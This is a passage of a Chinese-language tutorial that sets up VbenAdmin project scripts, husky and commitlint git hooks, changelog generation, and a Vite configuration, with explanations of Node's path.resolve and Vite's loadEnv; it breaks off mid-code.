\u0026#34;scripts\u0026#34;: { // ... \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, // ... } 作用：使用yarn安裝所有依賴。\nserve 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } 作用：以開發環境運行項目，並設置node的運行內存為4G。\n--max-old-space-size：單位為MB --max-new-space-size：單位為KB node命令行文檔 npx的Git首頁，有命令行說明 \u0026ndash;max-old-space-size参数说明 dev 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, // ... } 作用：同serve。\nbuild 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, // ... } 作用：這裡先不管。先使用原來創建項目的\u0026quot;build\u0026quot;: \u0026quot;vite build\u0026quot;。後面完成了vite配置之後再處理這個腳本。\nbuild:no-cache 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, // ... } 作用：清空緩存後構建。\nreport 作用：生成打包分析，這裡先不管，等後面配置vite再說。\npreview 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, // ... } 作用：先打包在進行預覽，使用vite訪問dist目錄。\npreview:dist 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, // ... } 作用：直接預覽本地 dist 文件目錄。\nlog 詳情查閱：使用conventional-changelog-cli生成變更記錄\n作用：用來生產Git提交記錄的。\nclean:cache 作用：刪除緩存，刪除node_modules/.cache/和node_modules/.vite下的文件，由於刪除命令依賴還沒安裝，所以後面再講。\nclean:lib 作用：清除依賴，刪除node_modules文件夾，由於刪除命令依賴還沒安裝，所以後面再講。\nlint:eslint 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, // ... } 作用：執行 eslint 校驗，該命令會對項目的src、mock目錄下的vue、ts、tsx文件進行 eslint 校驗，並修復部分問題。\n參考連結：eslint命令行說明\nlint:prettier 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, // ... } 作用：執行 prettier 格式化代碼。該命令會對項目所有代碼 進行 prettier 格式化。謹慎執行。\n如果你的vsCode安裝了prettier插件。那麼prettier插件就會讀取根目錄下的prettier.config.js文件。當你保存的時候就會進行格式化文件。\n但是過是別人提交上來的文件，你還去點開它的文件一個一個保存麼？所以執行這個命令，可以將src目錄下，所有的文件格式化。\n參考連結：prettier命令行說明\nlint:stylelint 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, // ... } 作用：校驗所有文件的樣式格式，並嘗試修復。\n參考連結：stylelint命令行说明\nlint:ls-lint 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, // ... } 作用：校驗所有文件命名是否正確。\nlint:lint-staged 需先創建lint-staged的配置文件\n代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, // ... } 作用：對Git暫存的文件進行lint檢查。\nlint:pretty 需先創建lint-staged的配置文件\n代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, // ... } 作用：對Git暫存文件進行pretty的操作。\ntest:gzip 作用：這個後面再說，http-server的npm首頁。\ntest:br 作用：這個後面再說，http-server的npm首頁。\nreinstall 作用：重新安裝依賴，該命令會先刪除 node_modules、yarn.lock、package.lock.json後在進行依賴重新安裝，速度會明顯變慢。\n由於刪除命令依賴還沒安裝，所以後面再講。\ninstall:husky 代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, // ... } 作用：這個是用來初始化husky的。啟用Git掛鉤。\n說明：如果不是CI服務器，就啟動Git鉤子。\ngen:icon 作用：生成圖標的，後面再說。\npostinstall 需先配置 husky\n代碼：\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34;, // ... } 作用：執行install:husky命令。這個命令會自動啟動Git鉤子，該操作參考：手動初始化husky和Yarn2下怎麼自動啟動Git鉤子函數。\n彙總 package.json除腳本、運行依賴、開發依賴外的字段參考官方文檔。\nyarn -v的腳本是後面要說的腳本。\npackage.json 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 { // ... \u0026#34;scripts\u0026#34;: { \u0026#34;bootstrap\u0026#34;: \u0026#34;yarn install\u0026#34;, \u0026#34;serve\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;dev\u0026#34;: \u0026#34;npx --max_old_space_size=4096 vite\u0026#34;, \u0026#34;build\u0026#34;: \u0026#34;vite build\u0026#34;, \u0026#34;build:no-cache\u0026#34;: \u0026#34;yarn clean:cache \u0026amp;\u0026amp; npm run build\u0026#34;, \u0026#34;report\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;preview\u0026#34;: \u0026#34;npm run build \u0026amp;\u0026amp; vite preview\u0026#34;, \u0026#34;preview:dist\u0026#34;: \u0026#34;vite preview\u0026#34;, \u0026#34;log\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:cache\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;clean:lib\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;lint:eslint\u0026#34;: \u0026#34;eslint \\\u0026#34;{src,mock}/**/*.{vue,ts,tsx}\\\u0026#34; --fix\u0026#34;, \u0026#34;lint:prettier\u0026#34;: \u0026#34;prettier --write --loglevel warn \\\u0026#34;src/**/*.{js,json,tsx,css,less,scss,vue,html,md}\\\u0026#34;\u0026#34;, \u0026#34;lint:stylelint\u0026#34;: \u0026#34;stylelint --fix \\\u0026#34;**/*.{vue,less,postcss,css,scss}\\\u0026#34; --cache --cache-location node_modules/.cache/stylelint/\u0026#34;, \u0026#34;lint:ls-lint\u0026#34;: \u0026#34;ls-lint\u0026#34;, \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34;, \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34;, \u0026#34;test:gzip\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;test:br\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;reinstall\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34;, \u0026#34;gen:icon\u0026#34;: \u0026#34;yarn -v\u0026#34;, \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; }, // ... } 安裝rimraf 說明 由於手動刪除文件夾太慢了，需要實現腳本刪除文件。\n參考連結 rimraf的npm首頁\nrimraf的npm首頁說明：\nThe UNIX command rm -rf for node.\nInstall with npm install rimraf, or just drop rimraf.js somewhere.\n翻譯：\nnode版的Unix系統命令rm -rf。\n用npm安裝rimraf，或者直接把rimraf.js放在某個地方。\n雖然這裡可以通過import使用函數刪除文件，但是我們主要是使用它的命令行蛤。\n詳情查看：rimraf的npm首頁-Cil說明。\n安裝 1 yarn add rimraf --dev 重寫腳本 就是根目錄下package.json的scripts字段。\nclean:cache package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:cache\u0026#34;: \u0026#34;rimraf node_modules/.cache/ \u0026amp;\u0026amp; rimraf node_modules/.vite\u0026#34;, // ... } 目的：刪除緩存，刪除node_modules/.cache/和node_modules/.vite下的文件。 clean:lib package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;clean:lib\u0026#34;: \u0026#34;rimraf node_modules\u0026#34;, // ... } 目的：清除依賴，刪除node_modules文件夾。 reinstall package.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;reinstall\u0026#34;: \u0026#34;rimraf yarn.lock \u0026amp;\u0026amp; rimraf package.lock.json \u0026amp;\u0026amp; rimraf node_modules \u0026amp;\u0026amp; npm run bootstrap\u0026#34;, // ... } 目的：重新安裝依賴，該命令會先刪除 node_modules、yarn.lock、package.lock.json後在進行依賴重新安裝，速度會明顯變慢。 使用husky規范代碼提交 說明 使用Git提交代碼的時候，需要對暫存的代碼進行如下操作：\n進行lint操作。 對commit的消息進行格式化檢查。 進行prettier操作。 需要安裝的依賴有：husky、lint-staged、@commitlint/cli、@commitlint/config-conventional、pretty-quick、is-ci。\nhusky：可以在Git的鉤子函數中執行腳本。 lint-staged：針對暫存文件進行lint操作。 @commitlint/cli：對commit的消息進行格式檢查。 @commitlint/config-conventional：commit的消息檢查格式傳統配置，對應還有很多其他配置，比如angular的提交規範@commitlint/config-angular。 pretty-quick：針對暫存文件進行prettier操作。 is-ci：husky好像不能在ci環境下執行，這個依賴是用來判斷是不是ci環境的。 參考連結 husky的npm首頁 husky官方文檔 lint-staged的npm首頁 @commitlint/cli的npm首頁 @commitlint/cil官網 @commitlint/config-conventional的首頁 pretty-quick的npm首頁 Prettier官網對Git鉤子函數的支持說明 is-ci的npm首頁 前端代碼規範從0到1 前端工作流 安裝 1 yarn add husky lint-staged @commitlint/cli @commitlint/config-conventional pretty-quick is-ci --dev 配置commitlint commitlint官方配置說明 commitlint配置規則 在根目錄下創建commitlint.config.js文件。\ncommitlint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 module.exports = { // ↓ 忽略包含init的提交消息 ignores: [(commit) =\u0026gt; commit.includes(\u0026#39;init\u0026#39;)], // ↓ 按照传统消息格式来验证 extends: [\u0026#39;@commitlint/config-conventional\u0026#39;], // ↓ 这里是自定义解析器，看不太懂，直接搬代码吧 // ↓ https://commitlint.js.org/#/reference-configuration?id=parser-presets parserPreset: { parserOpts: { headerPattern: /^(\\w*|[\\u4e00-\\u9fa5]*)(?:[\\(\\（](.*)[\\)\\）])?[\\:\\：] (.*)/, headerCorrespondence: [\u0026#39;type\u0026#39;, \u0026#39;scope\u0026#39;, \u0026#39;subject\u0026#39;], referenceActions: [ \u0026#39;close\u0026#39;, \u0026#39;closes\u0026#39;, \u0026#39;closed\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;fixes\u0026#39;, \u0026#39;fixed\u0026#39;, \u0026#39;resolve\u0026#39;, \u0026#39;resolves\u0026#39;, \u0026#39;resolved\u0026#39; ], issuePrefixes: [\u0026#39;#\u0026#39;], noteKeywords: [\u0026#39;BREAKING CHANGE\u0026#39;, \u0026#39;不兼容变更\u0026#39;], fieldPattern: /^-(.*?)-$/, revertPattern: /^Revert\\s\u0026#34;([\\s\\S]*)\u0026#34;\\s*This reverts commit (\\w*)\\./, revertCorrespondence: [\u0026#39;header\u0026#39;, \u0026#39;hash\u0026#39;], warn() {}, mergePattern: null, mergeCorrespondence: null } }, // ↓ 自定义提交消息规则 rules: { // ↓ body以空白行开头 \u0026#39;body-leading-blank\u0026#39;: [2, \u0026#39;always\u0026#39;], // ↓ footer以空白行开头 \u0026#39;footer-leading-blank\u0026#39;: [1, \u0026#39;always\u0026#39;], // ↓ header的最大长度 \u0026#39;header-max-length\u0026#39;: [2, \u0026#39;always\u0026#39;, 108], // ↓ subject为空 \u0026#39;subject-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // ↓ type为空 \u0026#39;type-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // ↓ type的类型 \u0026#39;type-enum\u0026#39;: [ 2, \u0026#39;always\u0026#39;, [ \u0026#39;feat\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;perf\u0026#39;, \u0026#39;style\u0026#39;, \u0026#39;docs\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;refactor\u0026#39;, \u0026#39;build\u0026#39;, \u0026#39;ci\u0026#39;, \u0026#39;chore\u0026#39;, \u0026#39;revert\u0026#39;, \u0026#39;wip\u0026#39;, \u0026#39;workflow\u0026#39;, \u0026#39;types\u0026#39; ] ] } }; 配置husky 啟動Git鉤子 1 npx husky install 這個時候就在根目錄下創建了.husky目錄了。 vben將裡面的一個文件夾刪除了。\n修復YarnOnWindowsBug 官方參考連結\n在帶有Git Bash（stdin is not a tty）的Windows上使用Yarn時，Git掛鉤可能會失敗。如果您有Windows用戶，則強烈建議添加以下解決方法。\n創建.husky/common.sh： 1 2 3 4 5 6 7 8 command_exists () { command -v \u0026#34;$1\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 } # Workaround for Windows 10, Git Bash and Yarn if command_exists winpty \u0026amp;\u0026amp; test -t 1; then exec \u0026lt; /dev/tty fi 在使用Yarn運行命令的地方將其來源： 1 2 3 4 5 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; yarn ... 這裡是yarn命令的地方要這樣用，其他地方要不要無所謂。第二步可以先不管。\n創建lint-staged的配置文件 lint:lint-staged package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34; } 作用：對Git暫存的文件進行lint檢查。\nlint:pretty package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34; } 作用：對Git暫存文件進行pretty的操作。\ninstall:husky package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34; } 作用：如果不是CI服務器，就啟動Git鉤子。\npostinstall package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; } 作用：執行install:husky命令。這個命令會自動啟動Git鉤子，參考文檔。\n給husky添加任務 npx的Git首頁，有命令行說明 commitlint的命令行說明 1 2 3 4 5 6 7 8 9 10 # 啟動husky yarn install:husky # 添加commit消息檢查任務到`.husky/commit-msg`文件中 # 這裡我一直執行不出來，是引號引其的問題，大家可以先創建空的然後把命令複製進去 # npx husky add .husky/commit-msg \u0026#39;npx --no-install commitlint --edit \u0026#34;$1\u0026#34;\u0026#39; npx husky add .husky/commit-msg # 創建一個任務文件 npx husky add .husky/pre-commit 手動修改.husky/commit-msg文件：\n這裡面的$1一定要用雙引號，不然後面執行會報錯。\n.husky/commit-msg 1 2 3 4 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; npx --no-install commitlint --edit \u0026#34;$1\u0026#34; 手動修改.husky/pre-commit文件：\n參考連結：\n在CI中禁用鉤子 在Windows上的Yarn 最後手動執行之前創建的腳本命令。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; [ -n \u0026#34;$CI\u0026#34; ] \u0026amp;\u0026amp; exit 0 # Check the file name # ! ls-lint cannot be used normally in mac pro of M1 system. npm run lint:ls-lint # Format and submit code according to lintstagedrc.js configuration npm run lint:lint-staged npm run lint:pretty 測試 失敗測試 最好先重啟你的ide\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 git add . git commit -m \u0026#34;隨便打一些消息\u0026#34; \u0026gt; vben3@0.0.0 lint:ls-lint F:\\CodeLearn\\vben\\vben3 \u0026gt; ls-lint \u0026gt; vben3@0.0.0 lint:lint-staged F:\\CodeLearn\\vben\\vben3 \u0026gt; lint-staged -c ./.husky/lintstagedrc.js [STARTED] Preparing... # 一系列檢查... [SUCCESS] Cleaning up... \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged �🔍 Finding changed files since git revision 1346762. �🎯 Found 2 changed files. ✅ Everything is awesome! ⧗ input: 隨便打一些消息 ✖ subject may not be empty [subject-empty] ✖ type may not be empty [type-empty] ✖ found 2 problems, 0 warnings ⓘ Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint husky - commit-msg hook exited with code 1 (error) 格式 出錯了，我們規範的提交消息試試：\n@commitlint/config-conventional的規範+我們自定義的規則。\ntype: some message\n類型英文 類型中文 build 建立 chore 雜事 ci ci docs 文檔 feat 壯舉 fix 修復 perf 敷衍 refactor 重構 revert 恢復 style 樣式 test 測試 成功測試 提交成功，當然你不用擔心這樣手敲太麻煩了，後面還有插件可以自動幫你敲這些格式。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 git commit -m \u0026#34;feat: 我們成功的規範了Git提交!\u0026#34; \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged �🔍 Finding changed files since git revision 1346762. �🎯 Found 2 changed files. ✅ Everything is awesome! [master 6c61fc5] feat: 我們成功的規範了Git提交! 7 files changed, 104 insertions(+), 4 deletions(-) create mode 100644 .husky/.gitignore create mode 100644 .husky/commit-msg create mode 100644 .husky/common.sh create mode 100644 .husky/lintstagedrc.js create mode 100644 .husky/pre-commit # 推送出去 git push -u origin master 使用conventional-changelog-cli生成變更記錄 說明 在VbenAdmin項目的腳本命令和根目錄中還有CHANGELOG.md這麼個文件，這是記錄我們項目變更記錄的MD。明顯不是手寫出來的，那麼怎麼生成？\n參考連結：\nconventional-changelog-cli的Git說明 conventional-changelog-cli的npm首頁 安裝 1 yarn add global conventional-changelog-cli --dev 配置腳本 package.json文件中的scripts字段。\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, // ... } 測試 1 yarn log 可以看見生成了CHANGELOG.md文件\n1 2 3 4 5 6 # 0.0.0 (2022-10-13) ### Features - 我们成功的规范了 Git 提交! ([6c61fc5](https://gitee.com/kuxiaoxin/vben3/commits/6c61fc5c0bc9d0ed551117eb00349ce82e35deea)) 命令列參數 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026gt; conventional-changelog --help Generate a changelog from git metadata Usage conventional-changelog Example conventional-changelog -i CHANGELOG.md --same-file Options -i, --infile Read the CHANGELOG from this file # 從這個文件中讀取CHANGELOG。 -o, --outfile Write the CHANGELOG to this file If unspecified, it prints to stdout # 將CHANGELOG寫入這個文件。 # 如果沒有指定，則打印到stdout。 -s, --same-file Outputting to the infile so you don\\\u0026#39;t need to specify the same file as outfile # 輸出到infile，所以你不需要指定與outfile相同的文件。 -p, --preset Name of the preset you want to use. Must be one of the following: angular, atom, codemirror, ember, eslint, express, jquery, jscs or jshint # 您要使用的預設名稱。必須是下列之一。 # angular, atom, codemirror, # ember, eslint, express, # jquery, jscs, jshint。 -k, --pkg A filepath of where your package.json is located Default is the closest package.json from cwd # 您的 package.json 所在的文件路徑。 # 默認為cwd中最接近的package.json。 -a, --append Should the newer release be appended to the older release Default: \\false # 是否應將較新的版本附加到較舊的版本上？ # 默認：不追加 -r, --release-count How many releases to be generated from the latest If 0, the whole changelog will be regenerated and the outfile will be overwritten Default: 1 # 將從最新的版本中生成多少個版本。 # 如果為0，整個變更日誌將被重新生成，並且輸出文件將被覆蓋。 # 默認值: 1 --skip-unstable If given, unstable tags will be skipped, e.g., x.x.x-alpha.1, x.x.x-rc.2 # 如果給定，將跳過不穩定的標籤，例如，x.x.x-alpha.1, x.x.x-rc.2。 -u, --output-unreleased Output unreleased changelog # 輸出未發布的變更日誌。 -v, --verbose Verbose output. Use this \\for debugging Default: \\false # Verbose 輸出。用來調試 # 默認：不輸出 -n, --config A filepath of your config script Example of a config script: https://github.com/conventional-changelog/conventional-changelog/blob/master/packages/conventional-changelog-cli/test/fixtures/config.js # 配置腳本的文件路徑。 # 配置腳本的例子： # https://github.com/conventional-changelog # /conventional-changelog/blob/master/packages # /conventional-changelog-cli/test/fixtures/config.js -c, --context A filepath of a json that is used to define template variables # 一個用於定義模板變量的json文件路徑。 -l, --lerna-package Generate a changelog \\for a specific lerna package (:pkg-name@1.0.0) # 為一個特定的lerna包生成一個變更日誌(:pkg-name@1.0.0) -t, --tag-prefix Tag prefix to consider when reading the tags # 讀取標籤時要考慮的標籤前綴。 --commit-path Generate a changelog scoped to a specific directory # 生成一個特定目錄下的變更日誌。 配置Vite 說明 本章只是準備，大家可以直接把VbenAdmin的vite.config.ts原代碼複製到我們的項目中。然後把報錯的地方註釋掉。接下來的章節會把這個文件一段一段的解析出來。章節做太長了大家應該也不喜歡看，至少我不喜歡看長文章。\n代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 import type { UserConfig, ConfigEnv } from \u0026#39;vite\u0026#39;; import { loadEnv } from \u0026#39;vite\u0026#39;; import { resolve } from \u0026#39;path\u0026#39;; // import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // import { wrapperEnv } from \u0026#39;./build/utils\u0026#39;; // import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd() const env = loadEnv(mode, root) // The boolean type read by loadEnv is a string. This function can be converted to boolean type // const viteEnv = wrapperEnv(env); // const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; // const isBuild = command === \u0026#39;build\u0026#39;; return { // base: VITE_PUBLIC_PATH, root, resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39; }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39; } ] }, server: { // port: VITE_PORT, // Load proxy configuration from .env // proxy: createProxy(VITE_PROXY), hmr: { overlay: true } }, build: { // minify: \u0026#39;esbuild\u0026#39;, // outDir: OUTPUT_DIR, // polyfillDynamicImport: VITE_LEGACY, terserOptions: { compress: { keep_infinity: true, // Used to delete console in production environment // drop_console: VITE_DROP_CONSOLE, }, }, // Turning off brotliSize display can slightly reduce packaging time brotliSize: false, chunkSizeWarningLimit: 1200 }, define: { // setting vue-i18-next // Suppress warning __VUE_I18N_LEGACY_API__: false, __VUE_I18N_FULL_INSTALL__: false, __INTLIFY_PROD_DEVTOOLS__: false }, css: { preprocessorOptions: { less: { modifyVars: { // Used for global import to avoid the need to import each style file separately // reference: Avoid repeated references hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;` // ...generateModifyVars(), }, javascriptEnabled: true } } }, // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed // plugins: createVitePlugins(viteEnv, isBuild), optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], exclude: [\u0026#39;vue-demi\u0026#39;] } } } Node的path.resolve方法 說明 psth.resolve([...paths])方法是NodeApi中path模塊的方法。\n參考連結 Node中文API path.resolve([\u0026hellip;paths])方法 path.resolve([\u0026hellip;path])方法在線運行 psth.resolve([\u0026hellip;pth])較通俗的理解 VbenAdmin原代碼 1 2 3 4 5 import { resolve } from \u0026#39;path\u0026#39; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir) } 代碼在項目中報錯 此時引入項目會報錯：找不到 path。\n因為我們沒有安裝node的聲明文件，ts裡面沒有。\n1 yarn add @types/node --dev 這個開發依賴在原VbenAdmin項目中沒有，是因為其他依賴中有這個依賴。\n但是我們現在還沒有安裝包含@types/node的依賴。\n剩下的依賴裡面有很多這樣的依賴，我們也不去猜是哪個依賴了。\n反正是一個開發依賴，我們直接自己手動安裝了。\nresolve方法 該方法百度上有兩種說法：\n從後向前，生成絕對路徑。 若字符以 / 開頭，不會拼接到前面的路徑（因為拼接到此已經是一個絕對路徑）。 若以 ../ 開頭，拼接前面的路徑，且不含最後一節路徑。 若以 ./ 開頭 或者沒有符號 則拼接前面路徑。 需要注意的是：如果在處理完所有給定的 path 片段之後還未生成絕對路徑，則再加上當前工作目錄。 每一個參數都理解為一個cd命令。最終cd到哪個路徑。返回該絕對路徑。 __dirname NodeApi的__dirname：當前模塊目錄名。\nNodeApi文檔-__dirname說明 __dirname在線運行 在線運行 1 2 3 4 5 6 const path = require(\u0026#39;path\u0026#39;) console.log(__dirname) console.log(path.resolve(__dirname, \u0026#39;.\u0026#39;, \u0026#39;src\u0026#39;)) // /tmp/B3YQQ1 // /tmp/B3YQQ1/src Vite的情景配置 說明 本章收集了一些Vite如何根據不同環境進行不同配置的資料。\n參考連結 Vite的中文首頁 Vite的英文首頁 Vite的情景配置說明 代碼 總之不管使用什麼方式配置Vite，最後返回的就只是一個對象。對像中包含Vite配置的細節。\n1 2 3 4 5 6 7 8 9 10 11 export default ({ command, mode }) =\u0026gt; { if (command === \u0026#34;serve\u0026#34;) { return { // serve 獨有配置 } } else { return { // build 獨有配置 } } } 參數說明 vite目前只有vite、vite build、vite preview這三種命令。以下是這三種命令的command和mode的值。\nvite command：serve mode：development vite build command：build mode：production vite preview command：serve mode：development Node的process 說明 返回 Node.js 進程的當前工作目錄。\n參考連結 Node中文文檔-process Node中文文檔-process.cwd()方法 在線運行process.cwd() 代碼 1 process.cwd() Vite的loadEnv方法 說明 檢查process.cwd()路徑下.env.development.local、.env.development、.env.local、.env這四個環境文件。 輸出NODE_ENV和VITE_開頭的鍵值對。 VITE_開頭的鍵值對後面的不會覆蓋前面的。 NODE_ENV的值後面的會覆蓋前面的。 參考連結 NodeApi中文文檔-process NodeApi中文文檔-process-env說明 NodeApi中文文檔-path NodeApi中文文檔-path.join()方法 NodeApi中文文檔-path.dirname()方法 NodeApi中文文檔-fs NodeApi中文文檔-fs.existsSync()方法 NodeApi中文文檔-fs.statSync()方法 NodeApi中文文檔-fs.readFileSync()方法 Node-process-env在線運行 Linux手冊頁-environ(7) Vite項目下.env系列文件命名的意義-中文文檔 Vite項目下.env系列文件命名的意義-英文文檔 原始碼 前置代碼 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // ↓ 加載node的path模塊 var path$1 = require(\u0026#39;path\u0026#39;); var fs$2 = require(\u0026#39;fs\u0026#39;); // ↓ 傳入的如果是一個包含\u0026#39;default\u0026#39;的key的對象，則輸出對象的\u0026#39;default\u0026#39;的key對應的value。 function _interopDefaultLegacy (e) { return e \u0026amp;\u0026amp; typeof e === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; \u0026#39;default\u0026#39; in e ? e[\u0026#39;default\u0026#39;] : e; } // ↓ 結合上面二者 var path__default = /*#__PURE__*/_interopDefaultLegacy(path$1); var fs__default = /*#__PURE__*/_interopDefaultLegacy(fs$2); // ↓ 